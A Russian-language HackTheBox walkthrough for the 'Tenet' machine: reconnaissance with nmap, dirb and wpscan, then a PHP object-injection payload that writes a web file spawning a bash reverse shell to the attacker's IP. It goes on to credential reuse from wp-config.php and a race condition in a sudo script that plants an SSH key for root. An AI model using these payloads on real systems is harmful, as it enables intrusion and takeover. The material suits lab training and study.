# Tenet
## HTB machine

- Название: Tenet  
- OS: Linux
- Ресурс: HackTheBox
- Сложность: Medium
- Дата релиза: 16.01.21

## Write-up

```html
┌──(kali@kali)-[~/Downloads]
└─$ nmap -sV 10.10.10.223
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-08 20:00 UTC
Nmap scan report for 10.10.10.223
Host is up (0.094s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.24 seconds
```

>Последняя версия апач:

```html
┌──(kali@kali)-[~/Downloads]
└─$ apache2 -v 10.10.10.223                                                  
Server version: Apache/2.4.46 (Debian)
Server built:   2021-01-11T10:58:23
```

>Проверим директории:

```html
┌──(kali@kali)-[~/Downloads]
└─$ dirb http://10.10.10.223/                        

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Mar  8 20:26:08 2021
URL_BASE: http://10.10.10.223/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.223/ ----
+ http://10.10.10.223/index.html (CODE:200|SIZE:10918)                          
+ http://10.10.10.223/server-status (CODE:403|SIZE:277)                         
==> DIRECTORY: http://10.10.10.223/wordpress/
```

>Перечисление юзеров не дало результата:

```html
┌──(kali@kali)-[~/Downloads]
└─$ apache-users -h 10.10.10.223 -l /usr/share/wordlists/metasploit/unix_users.txt -p 80 -s 0 -e 403 -t 10
Execution time: 20 seconds!
```

>Проверим с помощью wpscan:

```html
┌──(kali㉿kali)-[~/Downloads]
└─$ wpscan --url http://10.10.10.223/wordpress/ --enumerate
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.14
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.10.223/wordpress/ [10.10.10.223]
[+] Started: Mon Mar  8 21:05:54 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.10.223/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://10.10.10.223/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.10.223/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.10.223/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.6 identified (Outdated, released on 2020-12-08).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.10.223/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.6'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.10.223/wordpress/, Match: 'WordPress 5.6'

[i] The main theme could not be detected.

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:06 <=> (330 / 330) 100.00% Time: 00:00:06

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:50 <> (2568 / 2568) 100.00% Time: 00:00:50

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <====> (22 / 22) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:00 <========> (36 / 36) 100.00% Time: 00:00:00

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:00 <> (10 / 100) 10.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:00 <> (11 / 100) 11.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:00 <> (15 / 100) 15.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:00 <> (16 / 100) 16.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:00 <> (17 / 100) 17.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:00 <> (20 / 100) 20.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:00 <> (21 / 100) 21.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:00 <> (22 / 100) 22.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:00 <> (25 / 100) 25.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:00 <> (26 / 100) 26.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:01 <> (27 / 100) 27.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:01 <> (28 / 100) 28.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:01 <> (32 / 100) 32.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:01 <> (33 / 100) 33.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:01 <> (36 / 100) 36.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:01 <> (39 / 100) 39.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:01 <> (41 / 100) 41.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:01 <> (45 / 100) 45.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:01 <> (46 / 100) 46.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:01 <> (47 / 100) 47.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:01 <> (50 / 100) 50.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:01 <> (52 / 100) 52.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:01 <> (53 / 100) 53.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:01 <> (55 / 100) 55.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:02 <> (57 / 100) 57.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:02 <> (59 / 100) 59.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:02 <> (60 / 100) 60.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:02 <> (61 / 100) 61.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:02 <> (65 / 100) 65.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:02 <> (67 / 100) 67.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:02 <> (70 / 100) 70.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:02 <> (72 / 100) 72.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:02 <> (75 / 100) 75.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:02 <> (76 / 100) 76.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:02 <> (80 / 100) 80.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:02 <> (81 / 100) 81.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:02 <> (85 / 100) 85.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:02 <> (86 / 100) 86.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:02 <> (87 / 100) 87.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:03 <> (90 / 100) 90.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:03 <> (91 / 100) 91.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:03 <> (95 / 100) 95.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:03 <> (96 / 100) 96.00%  ETA: 00:00:0 Brute Forcing Attachment IDs - Time: 00:00:03 <> (100 / 100) 100.00% Time: 00:00:03

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===> (10 / 10) 100.00% Time: 00:00:00

[i] No Users Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Mar  8 21:07:05 2021
[+] Requests Done: 3099
[+] Cached Requests: 4
[+] Data Sent: 913.162 KB
[+] Data Received: 476.874 KB
[+] Memory used: 193.535 MB
[+] Elapsed time: 00:01:11
```

>В целом ничего интересного, однако на одной из страниц можно найти коментарий:

>did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!

>В нем говорится о неком удаленном бекапе и php файле, пробуем его найти:

>http://10.10.10.223/sator.php

>Так же вытащим сам бекап, но сначала:

```html
┌──(kali@kali)-[~/Downloads]
└─$ sudo nano /etc/hosts          

10.10.10.223    tenet.htb
```

>И с помощью утилиты wget вытащим файл:

```html
┌──(kali@kali)-[~/Downloads]
└─$ wget http://10.10.10.223/sator.php.bak                  
--2021-03-08 23:02:41--  http://10.10.10.223/sator.php.bak
Connecting to 10.10.10.223:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 514 [application/x-trash]
Saving to: ‘sator.php.bak’

sator.php.bak        100%[===================>]     514  --.-KB/s    in 0s      

2021-03-08 23:02:41 (55.3 MB/s) - ‘sator.php.bak’ saved [514/514]
```

>Сам файл представляет из себя скрипт, который берет переменную и десериализует ее, подробнее об уязвимости -- https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection

```html
┌──(kali@kali)-[~/Downloads]
└─$ php -a
Interactive mode enabled

php > class DatabaseExport { 
	public $user_file = 'rce.php';
	public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/ЗДЕСЬ IP/ЗДЕСЬ ПОРТ 0>&1\'"); ?>'; 
	} 
	print urlencode(serialize(new DatabaseExport));
```

>Жмем enter и получаем подобную строку:

```html
O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A7%3A%22rce.php%22%3Bs%3A4%3A%22data%22%3Bs%3A74%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.10.14.168%2F1234+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
```

>С помощью curl передаем строку в переменную:

```html
curl -i http://tenet.htb/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A7%3A%22rce.php%22%3Bs%3A4%3A%22data%22%3Bs%3A74%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.10.14.168%2F1234+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
```

>Заранее включим слушатель:

```html
┌──(kali@kali)-[~/Downloads]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

>И обратимся в браузере по адресу http://tenet.htb/rce.php:

```html
┌──(kali@kali)-[~/Downloads]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.168] from (UNKNOWN) [10.10.10.223] 51966
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@tenet:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@tenet:/var/www/html
```

>Далее лезем в конфиги wordpress и находим пароль:

```html
www-data@tenet:/var/www/html/wordpress$ cat wp-config.php
cat wp-config.php

define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'neil' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Opera2112' );
```

>Эскалируемся и берем первый флаг:

```html
www-data@tenet:/var/www/html/wordpress$ su neil
su neil
Password: Opera2112

neil@tenet:/var/www/html/wordpress$ cd
cd
neil@tenet:~$ ls
ls
user.txt
neil@tenet:~$ cat user.txt
cat user.txt
6091f2c9ea78fa9b162c55**********
```

>Проверяем разрешения на выполнение:

```html
neil@tenet:~$ sudo -l
sudo -l
Matching Defaults entries for neil on tenet:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:

User neil may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
```

```html
neil@tenet:/usr/local/bin$ cat enableSSH.sh
cat enableSSH.sh
#!/bin/bash

checkAdded() {

        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)

        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then

                /bin/echo "Successfully added $sshName to authorized_keys file!"

        else

                /bin/echo "Error in adding $sshName to authorized_keys file!"

        fi

}

checkFile() {

        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then

                /bin/echo "Error in creating key file!"

                if [[ -f $1 ]]; then /bin/rm $1; fi

                exit 1

        fi

}

addKey() {

        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)

        (umask 110; touch $tmpName)

        /bin/echo $key >>$tmpName

        checkFile $tmpName

        /bin/cat $tmpName >>/root/.ssh/authorized_keys

        /bin/rm $tmpName

}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
addKey
checkAdded
```

>Этот скрипт записывает ключ id_rsa.pub в рандомно сгенерированный файл, потом копирует его содержимое в known_hosts корневого каталога.
>Для того чтобы провести вертикальную эскалацию, необходимо сгенерировать ssh ключи с помощью команды ssh-keygen, затем успеть записать публичный ключ в tmp файл:

```html
neil@tenet:~$ while true; do echo "ssh-rsa AAAAB3Nz****ПУБЛИЧНЫЙ КЛЮЧ****" | tee /tmp/ssh* > /dev/null; done
```

>Бесконечный цикл используется для того, чтобы ключ постоянно записывался в файл, в это время пробуем зайти как root юзер, это может получиться не с первого раза:

```html
┌──(kali@kali)-[~/.ssh]
└─$ ssh -i id_rsa root@10.10.10.223  
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 2.0


53 packages can be updated.
31 of these updates are security updates.
To see these additional updates run: apt list --upgradable


Last login: Thu Feb 11 14:37:46 2021
root@tenet:~# ls
root.txt
root@tenet:~# cat root,txt
cat: root,txt: No such file or directory
root@tenet:~# cat root.txt
5a145db89825bbc7fbb20e**********
```
